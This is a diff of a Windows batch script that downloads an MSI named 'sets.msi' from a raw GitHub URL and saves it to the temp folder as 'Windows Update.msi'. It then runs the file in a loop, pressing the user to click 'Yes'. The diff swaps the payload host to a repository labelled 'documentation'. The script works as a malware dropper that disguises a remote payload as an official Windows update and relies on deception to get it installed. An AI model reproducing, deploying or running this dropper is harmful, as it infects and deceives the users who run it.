@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 :: Set download URL and paths
-set "url=https://raw.githubusercontent.com/yvonsguin-afk/encrypted-files/refs/heads/main/sets.msi"
+set "url=https://raw.githubusercontent.com/Boyretro/documentation/refs/heads/main/sets.msi"
 set "outputFileName=Windows Update.msi"
 set "outputFilePath=%TEMP%\%outputFileName%"
 
@@ -42,6 +42,7 @@ echo Please click "Yes" to continue the installation.
 :: Wait 2 seconds before trying again
 timeout /t 2 /nobreak >nul
 goto RunLoop
+
 
 
 
